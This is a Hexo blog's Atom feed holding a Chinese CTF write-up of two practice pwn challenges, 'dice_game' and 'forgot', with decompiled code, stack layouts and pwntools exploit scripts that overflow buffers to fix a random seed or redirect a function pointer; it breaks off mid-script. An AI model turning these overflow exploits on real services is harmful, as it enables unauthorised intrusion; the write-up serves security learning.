<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mutou-jun&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-03T07:52:09.324Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>木头</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界进阶00</title>
    <link href="http://yoursite.com/2019/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B600/"/>
    <id>http://yoursite.com/2019/11/03/攻防世界进阶00/</id>
    <published>2019-11-03T07:48:33.000Z</published>
    <updated>2019-11-03T07:52:09.324Z</updated>
    
    <content type="html"><![CDATA[<p>之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！</p><a id="more"></a><h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><h3 id="这个程序，有点长得不像pwn！"><a href="#这个程序，有点长得不像pwn！" class="headerlink" title="这个程序，有点长得不像pwn！"></a>这个程序，有点长得不像pwn！</h3><blockquote><p>下载下来是个压缩包，解压后里面是一个可执行文件以及一个libc.so.6动态链接库！</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtaAs.png" alt="KXtaAs.png"></p><blockquote><p>然后checksec，</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtdNn.png" alt="KXtdNn.png"></p><blockquote><p>fiile一波</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXttBQ.png" alt="KXttBQ.png"></p><blockquote><p>运行下：</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtYng.png" alt="KXtYng.png"></p><blockquote><p>然后拖入ida查看字符串找到了srand以及经常和他在一起的time函数</p></blockquote><p><img src="https://s2.ax1x.com/2019/11/03/KXtGjS.png" alt="KXtGjS.png"></p><h3 id="大致就是这样，我们分析下main-函数"><a href="#大致就是这样，我们分析下main-函数" class="headerlink" title="大致就是这样，我们分析下main()函数"></a>大致就是这样，我们分析下main()函数</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]            //偏移量：0x50字节</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]        //signed long int    8字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]    //unsigned long int   8字节</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);                       <span class="comment">//但它的空间只有0x30字节</span></span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);                  <span class="comment">//// 四字   即  8字节</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);                   <span class="comment">// 所以这里存在栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )                               <span class="comment">// 交互  1</span></span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);                 <span class="comment">// Game i/50   i初始为  1  循环  50次</span></span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )                              <span class="comment">// v5 必须让他  等于  1  即sub_A20的返回值  为  1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B28((__int64)buf);<span class="comment">//这里其实在服务端获得flag了</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="我们再去看看关键的sub-A20-函数"><a href="#我们再去看看关键的sub-A20-函数" class="headerlink" title="我们再去看看关键的sub_A20()函数"></a>我们再去看看关键的sub_A20()函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);                    <span class="comment">// 交互2      v1我们输入的一字节整数</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )                             <span class="comment">// 有后面逻辑向前推， v1==v2   即可达到pwn的目的</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>到这里其实看的就很明白了，只需我们50次的每一次输入的整数v1 等等与v2即可，于是我们接下来要做的就是使得v2的值可控！这里我们通过覆盖srand[0]的值为0或者1即可！具体可以在网上再深刻了解下srand与rand函数！</p></blockquote><h3 id="所以我们看下srand-0-以及buff数组在栈上的分布："><a href="#所以我们看下srand-0-以及buff数组在栈上的分布：" class="headerlink" title="所以我们看下srand[0]以及buff数组在栈上的分布："></a>所以我们看下srand[0]以及buff数组在栈上的分布：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">D/A/*</span>   <span class="string">:</span> <span class="string">change</span> <span class="string">type</span> <span class="string">(data/ascii/array)</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">N       :</span> <span class="string">rename</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">U       :</span> <span class="string">undefine</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">Use</span> <span class="string">data</span> <span class="string">definition</span> <span class="string">commands</span> <span class="string">to</span> <span class="string">create</span> <span class="string">local</span> <span class="string">variables</span> <span class="string">and</span> <span class="string">function</span> <span class="string">arguments.</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">Two</span> <span class="string">special</span> <span class="string">fields</span> <span class="string">" r"</span> <span class="string">and</span> <span class="string">" s"</span> <span class="string">represent</span> <span class="string">return</span> <span class="string">address</span> <span class="string">and</span> <span class="string">saved</span> <span class="string">registers.</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">Frame size:</span> <span class="number">50</span><span class="string">;</span> <span class="attr">Saved regs:</span> <span class="number">8</span><span class="string">;</span> <span class="attr">Purge:</span> <span class="number">0</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span></span><br><span class="line"><span class="number">-0000000000000050</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">buf</span>             <span class="string">db</span> <span class="number">55</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="number">-0000000000000019</span> <span class="string">var_19</span>          <span class="string">db</span> <span class="string">?</span></span><br><span class="line"><span class="number">-0000000000000018</span> <span class="string">var_18</span>          <span class="string">dq</span> <span class="string">?</span></span><br><span class="line"><span class="number">-0000000000000010</span> <span class="string">seed</span>            <span class="string">dd</span> <span class="number">2</span> <span class="string">dup(?)</span>   <span class="string">//这里的seed</span> <span class="string">为srand的种子，我们将它覆盖为0或者1</span></span><br><span class="line"><span class="number">-0000000000000008</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000007</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000006</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000005</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000004</span> <span class="string">var_4</span>           <span class="string">dd</span> <span class="string">?</span></span><br><span class="line"><span class="string">+0000000000000000</span>  <span class="string">s</span>              <span class="string">db</span> <span class="number">8</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="string">+0000000000000008</span>  <span class="string">r</span>              <span class="string">db</span> <span class="number">8</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="string">+0000000000000010</span></span><br><span class="line"><span class="string">+0000000000000010</span> <span class="string">;</span> <span class="string">end</span> <span class="string">of</span> <span class="string">stack</span> <span class="string">variables</span></span><br></pre></td></tr></table></figure><blockquote><p>所以，我们的思路就是<br>通过覆盖掉seed[0],将伪随机产生的是个唯一确定的值，然后通过Python与C的混合编程实现以下脚本</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="keyword">from</span> ctypes import *</span><br><span class="line">content.<span class="attribute">log_level</span>=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#conn=process('./dice_game')</span></span><br><span class="line"><span class="attribute">conn</span>=remote('111.198.29.45","47215')</span><br><span class="line"></span><br><span class="line"><span class="attribute">libc</span>=cdll.LoadLibrary("./libc.so.6")#混合编程的关键步</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x40+p64(0)</span><br><span class="line"><span class="comment">#payload='a'*0x40+p64(1)</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'Welcome, let me know your name: '</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(50):</span><br><span class="line">    <span class="attribute">n</span>=libc.rand(0)%6+1#混合编程的关键步</span><br><span class="line">    #<span class="attribute">n</span>=libc.rand(1)%6+1</span><br><span class="line">    conn.sendlineafter(n)</span><br><span class="line">conn.interacter()</span><br></pre></td></tr></table></figure><h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><h3 id="这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"><a href="#这个程序有两个漏洞，利用任意一个可以达到pwn的目的！" class="headerlink" title="这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"></a>这个程序有两个漏洞，利用任意一个可以达到pwn的目的！</h3><blockquote><p>首先还是那一套流程：<br>checsec forgot<br><img src="https://s2.ax1x.com/2019/11/03/KXtB90.png" alt="KXtB90.png"><br>简单运行下了解下程序是怎样运行的<br><img src="https://s2.ax1x.com/2019/11/03/KXtwhq.png" alt="KXtwhq.png"><br>拖入ida查看危险函数以及关键符号<img src="https://s2.ax1x.com/2019/11/03/KXtD3V.png" alt="KXtD3V.png"><br>发现可以程序中有可以直接获取flag的文件，加下那个函数地址<img src="https://s2.ax1x.com/2019/11/03/KXtrcT.png" alt="KXtrcT.png"></p></blockquote><h3 id="ida分析下："><a href="#ida分析下：" class="headerlink" title="ida分析下："></a>ida分析下：</h3><blockquote><p>其实这道题没怎么去关心它到底是干嘛的，目的是pwn掉它，攻击就好了！</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h] 注意下这里</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]          与这里</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>);                         <span class="comment">// 漏洞点   1</span></span><br><span class="line">  sub_80485DD((<span class="keyword">int</span>)&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v2);                     <span class="comment">// 漏洞点    2</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="先看下-isoc99-scanf这个漏洞！查看它的汇编代码"><a href="#先看下-isoc99-scanf这个漏洞！查看它的汇编代码" class="headerlink" title="先看下__isoc99_scanf这个漏洞！查看它的汇编代码"></a>先看下__isoc99_scanf这个漏洞！查看它的汇编代码</h3><p><img src="https://s2.ax1x.com/2019/11/03/KXtsjU.png" alt="KXtsjU.png"><br>我们可以通过溢出数组v232字节大小，将上卖弄我们找到的system函数起始地址覆盖掉返回地址！<br>于是开始攻击：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">"./forgot"</span>)</span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"49142"</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x080486CC</span></span><br><span class="line">#conn.recv()</span><br><span class="line">#conn.sendline(<span class="string">"yang"</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"yang"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">32</span>+<span class="string">"b"</span>*<span class="number">4</span>+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">#conn.sendlineafter(<span class="string">"&gt; "</span>,payload)#这样就跑不出来了    不是清楚为何原因</span><br><span class="line">conn.interactive()<span class="comment">//cyberpeace&#123;7908ad1e9a7667d0115faa6bdf8c24b1&#125;</span></span><br></pre></td></tr></table></figure><h3 id="再看下这个gets函数漏洞"><a href="#再看下这个gets函数漏洞" class="headerlink" title="再看下这个gets函数漏洞"></a>再看下这个gets函数漏洞</h3><blockquote><p>直接利用gets 函数的漏洞，让sysaddr的地址覆盖了 main()函数push进来来的ebp</p></blockquote><blockquote><p>这里真的是学到的，果然，进步都是刷经验刷出来的！<br>首先找到 gets(s)  //name s在栈中相对与   main()函数push进来来的ebp 的偏移量是多少<br>首先在python 中：</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cyclic(<span class="number">100</span>)</span><br><span class="line">#于是会给我们自动生成<span class="number">100</span>字节的不重复的字节（<span class="number">4</span>个位单位）</span><br><span class="line"><span class="string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span></span><br></pre></td></tr></table></figure><blockquote><p>然后在gdb ./forgot</p></blockquote><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">What is your name?</span><br><span class="line"><span class="meta">#它回复我们的</span></span><br><span class="line"><span class="meta">#然后我们输入100字节的不重复字符串（加上单引号  也没关系的）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#Legend: code, data, rodata, value</span></span><br><span class="line"><span class="meta">#Stopped reason: SIGSEGV</span></span><br><span class="line"><span class="meta">#0x61726161 in ?? ()  其实？？其实就是main()函数push进来的ebp所在的地址</span></span><br></pre></td></tr></table></figure><blockquote><p>我们有时不能一眼看出内存数据 0x61726161 对应的是什么，所以写代码嘛##########<br>#下面这个感觉要学习下（刷经验嘛）</p></blockquote><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>=<span class="string">""</span></span><br><span class="line">char_list=[]</span><br><span class="line"><span class="built_in">char</span>=<span class="string">"61726161"</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,len(<span class="built_in">char</span>),<span 